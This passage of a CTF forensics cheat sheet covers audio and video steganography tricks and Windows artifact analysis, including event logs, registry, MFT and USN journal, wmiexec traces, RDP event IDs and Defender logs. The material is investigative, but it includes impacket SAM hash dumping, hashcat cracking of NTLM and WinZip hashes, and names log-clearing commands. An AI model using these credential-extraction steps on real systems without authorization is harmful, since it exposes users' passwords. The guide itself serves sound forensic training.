zbarimg accumulated.png
```

**Key insight:** When a video shows objects flashing at seemingly random positions, composite all frames together. The positions themselves encode the hidden data — each frame contributes one pixel/cell to a larger image. Convert to GIF for frame-by-frame inspection in GIMP, or use PIL/NumPy to take per-pixel maximum across all frames.

---

## Reversed Audio Hidden Message (ASIS CTF Finals 2013)

**Pattern:** Audio track (standalone or extracted from video) sounds garbled or unintelligible. Playing it in reverse reveals speech, numbers, or other meaningful content.

**Extraction and reversal:**
```bash
# Extract audio from video
ffmpeg -i challenge.mp4 -vn -acodec pcm_s16le audio.wav

# Reverse audio
sox audio.wav reversed.wav reverse
# Or: ffmpeg -i audio.wav -af areverse reversed.wav

# Play to hear hidden message
play reversed.wav
```

**Alternative:** Open in Audacity → Effect → Reverse. Listen for speech, numbers, or encoded data.

**Key insight:** Reversed audio is one of the simplest audio steganography techniques. If audio sounds like garbled speech with recognizable cadence, try reversing it first. The hidden content is often a numeric string (e.g., an MD5 hash) or instructions for the next step of the challenge. Check both the audio and video tracks of multimedia files independently.



---

<!-- Source: windows.md -->

# CTF Forensics - Windows

## Table of Contents
- [Windows Event Logs (.evtx)](#windows-event-logs-evtx)
- [Registry Analysis](#registry-analysis)
  - [OEMInformation Backdoor Detection](#oeminformation-backdoor-detection)
- [SAM Database Analysis](#sam-database-analysis)
- [Recycle Bin Forensics](#recycle-bin-forensics)
- [Browser History](#browser-history)
- [Windows Telemetry (imprbeacons.dat)](#windows-telemetry-imprbeaconsdat)
- [Hosts File Hidden Data](#hosts-file-hidden-data)
- [Contact Files (.contact)](#contact-files-contact)
- [WinZip AES Encrypted Archives](#winzip-aes-encrypted-archives)
- [NTFS MFT Analysis](#ntfs-mft-analysis)
- [USN Journal ($J) Analysis](#usn-journal-j-analysis)
- [SAM Account Creation Timing](#sam-account-creation-timing)
- [Impacket wmiexec.py Artifacts](#impacket-wmiexecpy-artifacts)
- [PowerShell History as Timeline](#powershell-history-as-timeline)
- [User Profile Creation as First Login Indicator](#user-profile-creation-as-first-login-indicator)
- [RDP Session Event IDs](#rdp-session-event-ids)
- [Windows Defender MPLog Analysis](#windows-defender-mplog-analysis)
- [Anti-Forensics Detection Checklist](#anti-forensics-detection-checklist)

---

## Windows Event Logs (.evtx)

**Key Event IDs:**

| Event ID | Description |
|----------|-------------|
| 1001 | Bugcheck/reboot |
| 41 | Unclean shutdown |
| 4720 | User account created |
| 4722 | User account enabled |
| 4724 | Password reset attempted |
| 4726 | User account deleted |
| 4738 | User account changed |
| 4781 | Account name changed (renamed) |

**Parse with python-evtx:**
```python
import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET

with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        xml_str = record.xml()
        root = ET.fromstring(xml_str)
        ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}

        event_id = root.find('.//ns:EventID', ns).text
        if event_id == '4720':
            data = {}
            for d in root.findall('.//ns:Data', ns):
                data[d.get('Name')] = d.text
            print(f"User created: {data.get('TargetUserName')}")
```

---

## Registry Analysis

```bash
# RegRipper
rip.pl -r NTUSER.DAT -p all

# Key hives
NTUSER.DAT   # User settings
SAM          # User accounts
SYSTEM       # System config
SOFTWARE     # Installed software
```

### OEMInformation Backdoor Detection

**Location:** `SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation`

```python
from Registry import Registry

reg = Registry.Registry("SOFTWARE")
key = reg.open("Microsoft\\Windows\\CurrentVersion\\OEMInformation")
for val in key.values():
    print(f"{val.name()}: {val.value()}")
```

**Malware indicator:** Modified `SupportURL` pointing to C2.

---

## SAM Database Analysis

**Required files:**
- `Windows/System32/config/SAM` - Password hashes
- `Windows/System32/config/SYSTEM` - Boot key

**Extract hashes with impacket:**
```python
from impacket.examples.secretsdump import LocalOperations, SAMHashes

localOps = LocalOperations('SYSTEM')
bootKey = localOps.getBootKey()
sam = SAMHashes('SAM', bootKey)
sam.dump()  # username:RID:LM:NTLM:::
```

**Verify/Crack NTLM:**
```python
from Crypto.Hash import MD4

def ntlm_hash(password):
    h = MD4.new()
    h.update(password.encode('utf-16-le'))
    return h.hexdigest()

# Crack with hashcat
# hashcat -m 1000 hashes.txt wordlist.txt
```

**Common RIDs:**
- 500 = Administrator
- 501 = Guest
- 1000+ = User accounts

---

## Recycle Bin Forensics

**Location:** `$Recycle.Bin\<SID>\`

**File structure:**
- `$R<random>.<ext>` - Actual deleted content
- `$I<random>.<ext>` - Metadata (original path, timestamp)

**Parse $I metadata:**
```python
# strings shows original path
# C.:.\.U.s.e.r.s.\.U.s.e.r.4.\.D.o.c.u.m.e.n.t.s.\.file.docx
```

**Hex-encoded flag fragments:**
```bash
cat '$R_InternSecret.txt'
# Output: 4B4354467B72656330...
echo "4B4354467B72656330..." | xxd -r -p
```

---

## Browser History

**Edge/Chrome (SQLite):**
```python
import sqlite3

history = "Users/<user>/AppData/Local/Microsoft/Edge/User Data/Default/History"
conn = sqlite3.connect(history)
cur = conn.cursor()
cur.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC")
for url, title in cur.fetchall():
    print(f"{title}: {url}")
```

---

## Windows Telemetry (imprbeacons.dat)

**Location:** `Users/<user>/AppData/Local/Packages/Microsoft.Windows.ContentDeliveryManager_*/LocalState/`

```bash
strings imprbeacons.dat | tr '&' '\n' | grep -E "CIP|geo_|COUNTRY"
```

**Key fields:** `CIP` (client IP), `geo_lat/long`, `COUNTRY`, `SMBIOSDM`

---

## Hosts File Hidden Data

**Location:** `Windows/System32/drivers/etc/hosts`

Attackers hide data with excessive whitespace:
```bash
# Detect hidden content
xxd hosts | tail -20
```

---

## Contact Files (.contact)

**Location:** `Users/<user>/Contacts/*.contact`

**Hidden data in Notes:**
```xml
<c:Notes>h1dden_c0ntr4ct5</c:Notes>
```

---

## WinZip AES Encrypted Archives

```bash
# Extract hash
zip2john encrypted.zip > zip_hash.txt

# Crack with hashcat (mode 13600)
hashcat -m 13600 zip_hash.txt wordlist.txt

# Hybrid: word + 4 digits
hashcat -m 13600 zip_hash.txt wordlist.txt -a 6 '?d?d?d?d'
```

---

## NTFS MFT Analysis

**Location:** `C:\$MFT` (Master File Table)

**Key techniques:**
- Filenames are stored in UTF-16LE in the MFT
- Each file has two timestamp sets: `$STANDARD_INFORMATION` (user-modifiable) and `$FILE_NAME` (system-controlled)
- Timestomping detection: Compare SI vs FN timestamps; if SI dates are much older than FN dates, the file was timestomped

```python
# Search MFT for filenames (binary file, use strings)
# ASCII:
# strings $MFT | grep -i "suspicious"
# UTF-16LE:
# strings -el $MFT | grep -i "suspicious"

# MFT record structure (1024 bytes each, starting at offset 0):
# - Offset 0x00: "FILE" signature
# - Attribute 0x30 ($FILE_NAME): Contains FN timestamps (reliable)
# - Attribute 0x10 ($STANDARD_INFORMATION): Contains SI timestamps (modifiable)
```

---

## USN Journal ($J) Analysis

**Location:** `C:\$Extend\$J` (Update Sequence Number Journal)

Tracks all file system changes. Critical when event logs are cleared.

```python
import struct, datetime

def parse_usn_record(data, offset):
    """Parse USN_RECORD_V2 at given offset"""
    rec_len = struct.unpack_from('<I', data, offset)[0]
    major = struct.unpack_from('<H', data, offset + 4)[0]  # Must be 2
    file_ref = struct.unpack_from('<Q', data, offset + 8)[0] & 0xFFFFFFFFFFFF
    parent_ref = struct.unpack_from('<Q', data, offset + 16)[0] & 0xFFFFFFFFFFFF
    timestamp = struct.unpack_from('<Q', data, offset + 32)[0]
    reason = struct.unpack_from('<I', data, offset + 40)[0]
    file_attr = struct.unpack_from('<I', data, offset + 52)[0]
    fn_len = struct.unpack_from('<H', data, offset + 56)[0]
    fn_off = struct.unpack_from('<H', data, offset + 58)[0]  # Usually 60
    filename = data[offset + fn_off:offset + fn_off + fn_len].decode('utf-16-le')
    dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp // 10)
    return dt, filename, reason, file_attr, parent_ref

# USN Reason flags:
# 0x1=DATA_OVERWRITE, 0x2=DATA_EXTEND, 0x4=DATA_TRUNCATION
# 0x100=FILE_CREATE, 0x200=FILE_DELETE, 0x1000=NAMED_DATA_OVERWRITE
# 0x80000000=CLOSE
```

**Key forensic uses:**
- Find file creation/deletion times even when logs are cleared
- Track wmiexec.py output files (`__<timestamp>.<random>`)
- Determine when PowerShell history was written (timeline of commands)
- Detect user profile creation (first interactive login time)

---

## SAM Account Creation Timing

When Security event logs (EventID 4720) are cleared, determine account creation time from the SAM registry:

```python
from regipy.registry import RegistryHive

sam = RegistryHive('SAM')
# Navigate to: SAM\Domains\Account\Users\Names\<username>
# The key's last_modified timestamp = account creation time
names_key = sam.get_key('SAM\\Domains\\Account\\Users\\Names')
for subkey in names_key.iter_subkeys():
    print(f"{subkey.name}: created {subkey.header.last_modified}")
```

---

## Impacket wmiexec.py Artifacts

**wmiexec.py** is a popular remote command execution tool using WMI. Key artifacts:

1. **Output files:** Creates `__<unix_timestamp>.<random>` in `C:\Windows\` (ADMIN$ share)
   - File is created, written with command output, read back, then deleted
   - Each command execution creates a new cycle
   - USN journal preserves create/delete timestamps even after file deletion

2. **WMI Provider Host:** `WMIPRVSE.EXE` prefetch file confirms WMI usage

3. **Timeline reconstruction:** Count USN create-delete cycles for the output file to determine number of commands executed

```python
# Search for wmiexec output files in MFT
# strings -el $MFT | grep -E '^__[0-9]{10}'
# The unix timestamp in the filename = approximate execution start time
```

---

## PowerShell History as Timeline

**Location:** `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

PSReadLine writes commands incrementally. **USN journal DATA_EXTEND events on this file correspond to individual command executions:**

```text
08:05:19 - FILE_CREATE + DATA_EXTEND → First command entered
08:05:50 - DATA_EXTEND → Second command entered
08:09:57 - DATA_EXTEND → Third command entered
```

This provides exact execution timestamps for each command even when PowerShell logs are cleared.

---

## User Profile Creation as First Login Indicator

When event logs are cleared, the user profile directory creation in USN journal reveals the first interactive login:

```python
# Search USN journal for username directory creation
# Reason flag 0x100 (FILE_CREATE) with parent ref matching C:\Users (MFT ref 512)
# Example: ithelper DIR FILE_CREATE parent=512 at 08:03:51
# → First login (RDP/console) was at approximately 08:03
```

**Key insight:** User profiles are only created on first interactive logon (RDP or console), not via WMI/wmiexec remote execution.

---

## RDP Session Event IDs

**TerminalServices-LocalSessionManager\Operational:**

| Event ID | Description |
|----------|-------------|
| 21 | Session logon succeeded |
| 22 | Shell start notification received |
| 23 | Session logoff succeeded |
| 24 | Session disconnected |
| 25 | Session reconnection succeeded |
| 40 | Session created |
| 41 | Session begin (user notification) |
| 42 | Shell start (user notification) |

**TerminalServices-RemoteConnectionManager\Operational:**

| Event ID | Description |
|----------|-------------|
| 261 | Listener received connection |
| 1149 | RDP user authentication succeeded (contains source IP) |

**RemoteDesktopServices-RdpCoreTS\Operational:**

| Event ID | Description |
|----------|-------------|
| 131 | Connection accepted (TCP, contains ClientIP:port) |
| 102 | Connection from client |
| 103 | Disconnected (check ReasonCode) |

---

## Windows Defender MPLog Analysis

**Location:** `C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log`

Rich source of threat detection timeline, even when other logs are cleared:

```bash
# Find threat detections
grep -i "DETECTION\|THREAT\|QUARANTINE" MPLog*.log

# Find ASR (Attack Surface Reduction) rule activity
grep -i "ASR\|Process.*Block" MPLog*.log

# Key ASR rules (indicators of attack attempts):
# - "Block Process Creations originating from PSExec & WMI commands"
# - "Block credential stealing from lsass.exe"
```

**Detection History files:** `C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\`
- Binary files containing SHA256, file paths, and detection names
- Parse with `strings` to extract IOCs

---

## Anti-Forensics Detection Checklist

When event logs are cleared (attacker used `wevtutil cl` or `Clear-EventLog`):

1. **USN Journal** - Survives log clearing; shows file operations timeline
2. **SAM registry** - Account creation timestamps preserved
3. **PowerShell history** - ConsoleHost_history.txt often survives
4. **Prefetch files** - Shows executed programs (C:\Windows\Prefetch\)
5. **MFT** - File metadata preserved even for deleted files
6. **Defender MPLog** - Separate from Windows event logs, often not cleared
7. **RDP event logs** - TerminalServices logs are separate from Security.evtx
8. **WMI repository** - C:\Windows\System32\wbem\Repository\OBJECTS.DATA
9. **Browser history** - SQLite databases in user AppData
10. **Registry timestamps** - Key last_modified times reveal activity

**Security.evtx EventID 1102** = "The audit log was cleared" (ironically logged even during clearing)
